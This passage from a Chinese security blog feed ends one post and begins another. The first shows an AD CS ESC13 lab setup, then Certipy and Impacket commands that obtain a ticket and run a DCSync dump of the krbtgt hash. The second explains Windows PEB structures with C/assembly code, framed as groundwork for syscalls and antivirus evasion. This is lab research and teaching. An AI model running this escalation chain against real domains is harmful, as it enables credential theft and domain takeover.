title="image-20240302144914080"><p>接着我们来到我们的ADCS，在终端中输入<code>certsrv.msc</code>打开我们的证书颁发机构，在证书模板这里右键管理打开证书模板控制台，我们可以直接复制现有的模板来创建新的漏洞模板。我们右键工作组身份验证选择复制模板，修改模板名称，在拓展这里双击颁发策略，点击添加</p><img src="/post/48e6280e/image-20240302144920658.png" class="" title="image-20240302144920658"><p>我们可以选择现有的颁发策略，也可以直接新建颁发策略，新建时填写名称就行了</p><img src="/post/48e6280e/image-20240302144925847.png" class="" title="image-20240302144925847"><p>在填完完成之后，点击拓展里的颁发策略，下面会显示已有的策略</p><img src="/post/48e6280e/image-20240302144931174.png" class="" title="image-20240302144931174"><p>我们需要给予用户对证书的申请权限</p><img src="/post/48e6280e/image-20240302144936230.png" class="" title="image-20240302144936230"><p>同时还有一个非常重要的一点，我们需要在使用者名称这里，将DNS名修改为用户主体名称(UPN)，因为我们新建的用户是没有dNSHostName这个属性的，不更改的话会导致证书申请失败</p><img src="/post/48e6280e/image-20240302144955762.png" class="" title="image-20240302144955762"><p>我们在终端中输入<code>adsiedit.msc</code>打开ADSI编辑器，然后连接AD的Configuration</p><img src="/post/48e6280e/image-20240302145000881.png" class="" title="image-20240302145000881"><p>找到我们的OID容器，在<code>CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=esg-red,DC=local</code>下，找到我们创建的颁发策略，修改其<code>msDS-OIDToGroupLink</code>属性为我们创建的通用组</p><img src="/post/48e6280e/image-20240302145005809.png" class="" title="image-20240302145005809"><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>我们找到支持ESC13的<a href="https://github.com/sploutchy/Certipy/tree/main">分支</a>下载下来，进入主目录，利用find进行简单的信息收集<br>可以看到，成功的扫描出了ESC13这个漏洞</p><img src="/post/48e6280e/image-20240302145011317.png" class="" title="image-20240302145011317"><p>然后我们申请pfx证书</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python entry.py req <span class="literal">-u</span> <span class="string">&#x27;ESC13User@esg-red.local&#x27;</span> <span class="literal">-p</span> <span class="string">&#x27;Admin13&#x27;</span> <span class="literal">-template</span> <span class="string">&#x27;ESC13&#x27;</span>  <span class="literal">-target</span> adcs.esg<span class="literal">-red</span>.local  <span class="literal">-ca</span> esg<span class="literal">-red-ADCS-CA</span></span><br></pre></td></tr></table></figure><img src="/post/48e6280e/image-20240302145015729.png" class="" title="image-20240302145015729"><p>我们利用申请的证书使用申请kirbi类型的票据并将其转化为Linux上使用的ccache类型</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python entry.py auth <span class="literal">-pfx</span> esc13user.pfx <span class="literal">-dc-ip</span> <span class="number">10.10</span>.<span class="number">10.128</span> <span class="literal">-kirbi</span></span><br><span class="line">impacket<span class="literal">-ticketConverter</span> esc13user.kirbi esc13user.ccache</span><br></pre></td></tr></table></figure><img src="/post/48e6280e/image-20240302145020565.png" class="" title="image-20240302145020565"><p>我们利用impacket分支的<a href="https://github.com/ThePorgs/impacket/blob/7a0ec36036b9b3339a7a72290f33c243a5e4f0b9/examples/describeTicket.py#L4">describeTicket.py</a>脚本解密查看，可以看到确实是存在2616这个组的权限</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python aaa.py esc13user.ccache <span class="literal">--aes</span> <span class="number">3</span>c4f06f1b46e0d5d30fe428ce08921964cae205def01fcf3b643dacf40a27983</span><br></pre></td></tr></table></figure><img src="/post/48e6280e/image-20240302145026443.png" class="" title="image-20240302145026443"><p>导入票据</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=esc13user.ccache</span><br></pre></td></tr></table></figure><img src="/post/48e6280e/image-20240302145031926.png" class="" title="image-20240302145031926"><p>尝试DCSync攻击</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket<span class="literal">-secretsdump</span> esg<span class="literal">-red</span>.local/ESC13User@DC.esg<span class="literal">-red</span>.local  <span class="literal">-k</span> <span class="literal">-no-pass</span> <span class="literal">-just-dc-user</span> <span class="string">&#x27;krbtgt&#x27;</span> <span class="literal">-debug</span></span><br></pre></td></tr></table></figure><img src="/post/48e6280e/image-20240302145036415.png" class="" title="image-20240302145036415"><h2 id="0x4-总结："><a href="#0x4-总结：" class="headerlink" title="0x4 总结："></a>0x4 总结：</h2><p>感觉这个利用属于是”可遇而不可求“，感觉利用限制很多，而且获取的还不一定是高权限组的权限，不过我们可以配合其他漏洞，例如ESC5来修改PKI的ACL等。本篇文章只是暂时分析了一下成因及其简单利用，后续有其他利用姿势欢迎大佬补充，文章有什么错误也欢迎大佬斧正。</p>]]></content>
      
      
      <categories>
          
          <category> AD域 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AD域 </tag>
            
            <tag> ADCS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解析PEB</title>
      <link href="/post/db27253d.html"/>
      <url>/post/db27253d.html</url>
      
        <content type="html"><![CDATA[<h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>学习syscall和免杀绕不开PEB这个部分，我们要对相关结构熟悉，既要会手动解析，也能利用代码解析。</p><h3 id="PEB结构："><a href="#PEB结构：" class="headerlink" title="PEB结构："></a>PEB结构：</h3><p>经典大图，永不过时：</p><img src="/post/db27253d/1678437013915-a86d3186-b781-47d0-b4a0-8df5788b0485.png" class=""><p>注：PEB的结构微软并未完全公开，以上图片可以参考但不一定权威</p><p>如果你对偏移比较熟悉的话可以直接用指针+偏移找，不需要特地定义结构体，而且双向链表<code>_LIST_ENTRY</code>这个是公开的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> &#123;</span><br><span class="line">   <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> *Flink;</span><br><span class="line">   <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> *Blink;</span><br><span class="line">&#125; LIST_ENTRY, *PLIST_ENTRY, *RESTRICTED_POINTER PRLIST_ENTRY;</span><br></pre></td></tr></table></figure><p><strong>自定义PEB的结构</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_PEB</span> &#123;</span><br><span class="line">    BOOLEAN InheritedAddressSpace;</span><br><span class="line">    BOOLEAN ReadImageFileExecOptions;</span><br><span class="line">    BOOLEAN BeingDebugged;</span><br><span class="line">    BOOLEAN Spare;</span><br><span class="line">    HANDLE Mutant;</span><br><span class="line">    PVOID ImageBase;</span><br><span class="line">    PPEB_LDR_DATA LoaderData;<span class="comment">// 0x0c </span></span><br><span class="line">    PVOID ProcessParameters;</span><br><span class="line">    PVOID SubSystemData;</span><br><span class="line">    PVOID ProcessHeap;</span><br><span class="line">    PVOID FastPebLock;</span><br><span class="line">    PVOID FastPebLockRoutine;</span><br><span class="line">    PVOID FastPebUnlockRoutine;</span><br><span class="line">    ULONG EnvironmentUpdateCount;</span><br><span class="line">    PVOID* KernelCallbackTable;</span><br><span class="line">    PVOID EventLogSection;</span><br><span class="line">    PVOID EventLog;</span><br><span class="line">    PVOID FreeList;</span><br><span class="line">    ULONG TlsExpansionCounter;</span><br><span class="line">    PVOID TlsBitmap;</span><br><span class="line">    ULONG TlsBitmapBits[<span class="number">0x2</span>];</span><br><span class="line">    PVOID ReadOnlySharedMemoryBase;</span><br><span class="line">    PVOID ReadOnlySharedMemoryHeap;</span><br><span class="line">    PVOID* ReadOnlyStaticServerData;</span><br><span class="line">    PVOID AnsiCodePageData;</span><br><span class="line">    PVOID OemCodePageData;</span><br><span class="line">    PVOID UnicodeCaseTableData;</span><br><span class="line">    ULONG NumberOfProcessors;</span><br><span class="line">    ULONG NtGlobalFlag;</span><br><span class="line">    BYTE Spare2[<span class="number">0x4</span>];</span><br><span class="line">    LARGE_INTEGER CriticalSectionTimeout;</span><br><span class="line">    ULONG HeapSegmentReserve;</span><br><span class="line">    ULONG HeapSegmentCommit;</span><br><span class="line">    ULONG HeapDeCommitTotalFreeThreshold;</span><br><span class="line">    ULONG HeapDeCommitFreeBlockThreshold;</span><br><span class="line">    ULONG NumberOfHeaps;</span><br><span class="line">    ULONG MaximumNumberOfHeaps;</span><br><span class="line">    PVOID** ProcessHeaps;</span><br><span class="line">    PVOID GdiSharedHandleTable;</span><br><span class="line">    PVOID ProcessStarterHelper;</span><br><span class="line">    PVOID GdiDCAttributeList;</span><br><span class="line">    PVOID LoaderLock;</span><br><span class="line">    ULONG OSMajorVersion;</span><br><span class="line">    ULONG OSMinorVersion;</span><br><span class="line">    ULONG OSBuildNumber;</span><br><span class="line">    ULONG OSPlatformId;</span><br><span class="line">    ULONG ImageSubSystem;</span><br><span class="line">    ULONG ImageSubSystemMajorVersion;</span><br><span class="line">    ULONG ImageSubSystemMinorVersion;</span><br><span class="line">    ULONG GdiHandleBuffer[<span class="number">0x22</span>];</span><br><span class="line">    ULONG PostProcessInitRoutine;</span><br><span class="line">    ULONG TlsExpansionBitmap;</span><br><span class="line">    BYTE TlsExpansionBitmapBits[<span class="number">0x80</span>];</span><br><span class="line">    ULONG SessionId;</span><br><span class="line">&#125; PEB, * PPEB;</span><br></pre></td></tr></table></figure><p>我们主要是需要0x0c(64位为0x18)偏移处的<code>PPEB_LDR_DATA</code>结构</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_PEB_LDR_DATA</span> &#123;</span><br><span class="line">    ULONG Length;</span><br><span class="line">    ULONG Initialized;</span><br><span class="line">    PVOID SsHandle;</span><br><span class="line">    LIST_ENTRY InLoadOrderModuleList;</span><br><span class="line">    LIST_ENTRY InMemoryOrderModuleList;</span><br><span class="line">    LIST_ENTRY InInitializationOrderModuleList;</span><br><span class="line">&#125; PEB_LDR_DATA, * PPEB_LDR_DATA;</span><br></pre></td></tr></table></figure><p>在<code>PEB_LDR_DATA</code>的0x0c、0x14、0x1c中为三个双向链表<code>LIST_ENTRY</code><br>三个链表加载模块分别代表<strong>模块加载顺序，模块在内存中的加载顺序以及模块初始化装载的顺序</strong>，<code>PEB_LDR_DATA</code>结构类似于一个火车头，三个双向链表<code>LIST_ENTRY</code>意思相同，只是顺序不一样，都指向下一个_LDR_DATA_TABLE_ENTRY结构（也有的定义为<code>_LDR_MODULE</code> 结构）毕竟微软没有公开结构，只要我们所需的偏移一致就行。<br><strong>_LDR_DATA_TABLE_ENTRY 32位版本：</strong></p><img src="/post/db27253d/1678441105093-4fb57c3a-5abd-477d-b806-adb566de0139.png" class=""><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_LDR_DATA_TABLE_ENTRY</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> InLoadOrderLinks;                                    <span class="comment">//0x0</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> InMemoryOrderLinks;                                  <span class="comment">//0x8</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> InInitializationOrderLinks;                          <span class="comment">//0x10</span></span><br><span class="line">    VOID* DllBase;                                                          <span class="comment">//0x18</span></span><br><span class="line">    VOID* EntryPoint;                                                       <span class="comment">//0x1c</span></span><br><span class="line">    ULONG SizeOfImage;                                                      <span class="comment">//0x20</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_UNICODE_STRING</span> FullDllName;                                     <span class="comment">//0x24</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_UNICODE_STRING</span> BaseDllName;                                     <span class="comment">//0x2c</span></span><br><span class="line">    ULONG Flags;                                                            <span class="comment">//0x34</span></span><br><span class="line">    USHORT LoadCount;                                                       <span class="comment">//0x38</span></span><br><span class="line">    USHORT TlsIndex;                                                        <span class="comment">//0x3a</span></span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> HashLinks;                                       <span class="comment">//0x3c</span></span><br><span class="line">        <span class="keyword">struct</span></span><br><span class="line">        &#123;</span><br><span class="line">            VOID* SectionPointer;                                           <span class="comment">//0x3c</span></span><br><span class="line">            ULONG CheckSum;                                                 <span class="comment">//0x40</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">        ULONG TimeDateStamp;                                                <span class="comment">//0x44</span></span><br><span class="line">        VOID* LoadedImports;                                                <span class="comment">//0x44</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_ACTIVATION_CONTEXT</span>* EntryPointActivationContext;                <span class="comment">//0x48</span></span><br><span class="line">    VOID* PatchInformation;                                                 <span class="comment">//0x4c</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> ForwarderLinks;                                      <span class="comment">//0x50</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> ServiceTagLinks;                                     <span class="comment">//0x58</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> StaticLinks;                                         <span class="comment">//0x60</span></span><br><span class="line">    VOID* ContextInformation;                                               <span class="comment">//0x68</span></span><br><span class="line">    ULONG OriginalBase;                                                     <span class="comment">//0x6c</span></span><br><span class="line">    <span class="keyword">union</span> <span class="title class_">_LARGE_INTEGER</span> LoadTime;                                          <span class="comment">//0x70</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>_LDR_DATA_TABLE_ENTRY64 64位版本：</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_LDR_DATA_TABLE_ENTRY64</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">LIST_ENTRY64</span> InLoadOrderLinks;                                    <span class="comment">//0x0</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">LIST_ENTRY64</span> InMemoryOrderLinks;                                  <span class="comment">//0x10</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">LIST_ENTRY64</span> InInitializationOrderLinks;                          <span class="comment">//0x20</span></span><br><span class="line">    VOID* DllBase;                                                          <span class="comment">//0x30</span></span><br><span class="line">    VOID* EntryPoint;                                                       <span class="comment">//0x38</span></span><br><span class="line">    ULONG SizeOfImage;                                                      <span class="comment">//0x40</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_UNICODE_STRING</span> FullDllName;                                     <span class="comment">//0x48</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_UNICODE_STRING</span> BaseDllName;                                     <span class="comment">//0x58</span></span><br><span class="line">    ULONG Flags;                                                            <span class="comment">//0x68</span></span><br><span class="line">    USHORT LoadCount;                                                       <span class="comment">//0x6c</span></span><br><span class="line">    USHORT TlsIndex;                                                        <span class="comment">//0x6e</span></span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">LIST_ENTRY64</span> HashLinks;                                       <span class="comment">//0x70</span></span><br><span class="line">        <span class="keyword">struct</span></span><br><span class="line">        &#123;</span><br><span class="line">            VOID* SectionPointer;                                           <span class="comment">//0x70</span></span><br><span class="line">            ULONG CheckSum;                                                 <span class="comment">//0x78</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">        ULONG TimeDateStamp;                                                <span class="comment">//0x80</span></span><br><span class="line">        VOID* LoadedImports;                                                <span class="comment">//0x80</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_ACTIVATION_CONTEXT</span>* EntryPointActivationContext;                <span class="comment">//0x88</span></span><br><span class="line">    VOID* PatchInformation;                                                 <span class="comment">//0x90</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">LIST_ENTRY64</span> ForwarderLinks;                                      <span class="comment">//0x98</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">LIST_ENTRY64</span> ServiceTagLinks;                                     <span class="comment">//0xa8</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">LIST_ENTRY64</span> StaticLinks;                                         <span class="comment">//0xb8</span></span><br><span class="line">    VOID* ContextInformation;                                               <span class="comment">//0xc8</span></span><br><span class="line">    ULONGLONG OriginalBase;                                                 <span class="comment">//0xd0</span></span><br><span class="line">    <span class="keyword">union</span> <span class="title class_">_LARGE_INTEGER</span> LoadTime;                                          <span class="comment">//0xd8</span></span><br><span class="line">&#125;LDR_DATA_TABLE_ENTRY64, * PLDR_DATA_TABLE_ENTRY64;</span><br></pre></td></tr></table></figure><p><strong>_LDR_MODULE 版本：</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_LDR_MODULE</span> &#123;</span><br><span class="line">    LIST_ENTRY InLoadOrderModuleList;</span><br><span class="line">    LIST_ENTRY InMemoryOrderModuleList;</span><br><span class="line">    LIST_ENTRY InInitializationOrderModuleList;</span><br><span class="line">    PVOID BaseAddress;</span><br><span class="line">    PVOID EntryPoint;</span><br><span class="line">    ULONG SizeOfImage;</span><br><span class="line">    UNICODE_STRING FullDllName;</span><br><span class="line">    UNICODE_STRING BaseDllName;</span><br><span class="line">    ULONG Flags;</span><br><span class="line">    SHORT LoadCount;</span><br><span class="line">    SHORT TlsIndex;</span><br><span class="line">    LIST_ENTRY HashTableEntry;</span><br><span class="line">    ULONG TimeDateStamp;</span><br><span class="line">&#125; LDR_MODULE, * PLDR_MODULE;</span><br></pre></td></tr></table></figure><p><code>PPEB_LDR_DATA</code>结构是一个入口，类似于火车头，里面<code>_LIST_ENTRY-&gt;Flink</code>指向第一个_LDR_DATA_TABLE_ENTRY，然后第一个指向第二个以此类推，最后一个指向第一个，而<code>_LIST_ENTRY-&gt;Blink</code>指向的是上一个火车，第二个指向火车头，火车头指向最后一个。</p><img src="/post/db27253d/1678441641758-dfd9ac3a-205f-470e-b440-6f4ba6bcbc99.png" class=""><p>这是广为流传的一张图，大多数文章都会拿它做案例，但其实它有一点点错误（吐槽：这么多人都没发现)，Blink指向的并不是上一个Blink，而是指向上一个<code>LIST_ENTRY</code>的地址，下面进行详细分析。</p><h3 id="解析PEB："><a href="#解析PEB：" class="headerlink" title="解析PEB："></a>解析PEB：</h3><p>我们如何找到PEB的地址？这里有三种方法：</p><ol><li>查看OD等调试器的寄存器窗口，fs段寄存器的后面会接着TEB结构指针。直接在内存窗口跳过去即可</li><li>通过fs的值拆分成段选择子，通过GDT表查找段描述符，得到一个3环的调用门….#*#%$()#…..  很显然我不会，直接放弃。</li><li>第三种是最方便的，32位：fs:[0x18]存储着TEB结构指针，fs:[0x30]存储着PEB结构指针。64位：gs:[0x60]存储着PEB结构指针。</li></ol><p>为什么不能通过fs直接过去呢？因为fs存储的是段选择子，不是真正的地址所以需要通过偏移。<br>接下来尝试手动解析：这里用的是64位exe，工具x64dbg</p><img src="/post/db27253d/1678442221771-ed156fe0-67dd-442e-8fe4-312cd5b4005e.png" class=""><p>利用gs:[0x60]获取PEB地址，也可以直接用peb()快捷获取，得到地址：000000CA38C50000，ctrl+g跳转，此时就是PEB的结构指针。我们在0x18h(在64位下偏移是18h)处找到<code>PPEB_LDR_DATA</code>地址00007FF8E7B1C4C0</p><img src="/post/db27253d/1678677608598-6b58788b-2e47-4a18-89f2-ac2001f8dad2.png" class=""><p>跳转到<code>PPEB_LDR_DATA</code>处,0X20处偏移是我们要找的第一个<code>LDR_DATA_TABLE_ENTRY</code>的<code>InMemoryOrderModuleList</code>地址：0000021892B02820，此时</p><ul><li>Flink地址：0000021892B02650</li><li>Blink地址：00007FF8E7B1C4E0</li></ul><img src="/post/db27253d/1678690802015-b4a28afd-fb9f-4dd1-b901-c214e5311f3e.png" class=""><ul><li>EntryPoint：00007FF7A96916E0</li><li>FullDllName：（0x58-0x60）</li><li>BaseDllName：(0x68-0x70)</li></ul><p>根据Flink跳转至下一个<code>LDR_DATA_TABLE_ENTRY</code></p><img src="/post/db27253d/1678691622423-45b01e51-1b0f-4586-a5cf-37ac53366bf0.png" class=""><p>下一个_LDR_DATA_TABLE_ENTRY结构的<code>InMemoryOrderModuleList</code>处<br>此时Flink：0000021892B02D70指向下一个<code>InMemoryOrderModuleList</code>地址，Blink：0000021892B02820刚好指向了上一个<code>InMemoryOrderModuleList</code>地址</p><ul><li>FullDllName：c:\windows\system32\ntdll.dll</li><li>BaseDllName：ntdll.dll</li></ul><p>继续下一跳，Flink：0000021892B02D70，Blink：0000021892B02650刚好指向ntdll.dll的<code>InMemoryOrderModuleList</code>起始地址</p><img src="/post/db27253d/1678691953598-bd24213c-7a93-4482-bc71-d03695d60145.png" class=""><p>我们可以依次遍历下去，找到我们所需要的基址</p><h3 id="代码实现："><a href="#代码实现：" class="headerlink" title="代码实现："></a>代码实现：</h3><p>微软很贴心的提供了两个获取PEB的api</p><ul><li><a href="https://docs.microsoft.com/en-us/cpp/intrinsics/readgsbyte-readgsdword-readgsqword-readgsword?view=msvc-170&viewFallbackFrom=vs-2019">__readgsqword</a> 64位</li><li><a href="https://docs.microsoft.com/en-us/cpp/intrinsics/readfsbyte-readfsdword-readfsqword-readfsword?view=msvc-170&viewFallbackFrom=vs-2019">__readfsqword</a>  32位</li></ul><p>我们也可以不用Windows的api</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 64位</span></span><br><span class="line">.CODE</span><br><span class="line">  GetPeb64 PROC</span><br><span class="line">    mov rax,gs:[<span class="number">60</span>h]</span><br><span class="line">  ret</span><br><span class="line">  GetPeb64 ENDP</span><br><span class="line"> END</span><br><span class="line"></span><br><span class="line"><span class="comment">//32位</span></span><br><span class="line">.CODE</span><br><span class="line">    GetPeb32 PROC</span><br><span class="line">    mov rax, fs:[<span class="number">30</span>h];</span><br><span class="line">    ret;</span><br><span class="line">    GetPeb32 ENDP</span><br><span class="line">END</span><br><span class="line"></span><br><span class="line"><span class="comment">// 也可以直接找到ldr地址</span></span><br><span class="line">.CODE</span><br><span class="line">    GetPebLdr PROC</span><br><span class="line">    mov rax, gs:[<span class="number">60</span>h];</span><br><span class="line">    add rax, <span class="number">18</span>h;</span><br><span class="line">    mov rax, [rax];</span><br><span class="line">    ret;</span><br><span class="line">    GetPebLdr ENDP</span><br><span class="line">END</span><br></pre></td></tr></table></figure><p>asm.h</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> __ASMCODE_H</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function">PVOID64 _cdecl <span class="title">GetPeb</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><h4 id="定义结构体查找导出函数地址："><a href="#定义结构体查找导出函数地址：" class="headerlink" title="定义结构体查找导出函数地址："></a>定义结构体查找导出函数地址：</h4><p>注：结构体定义太长了没贴上来，对着上面抄就行了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winternl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;global.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PIMAGE_DOS_HEADER pDos = <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_FILE_HEADER 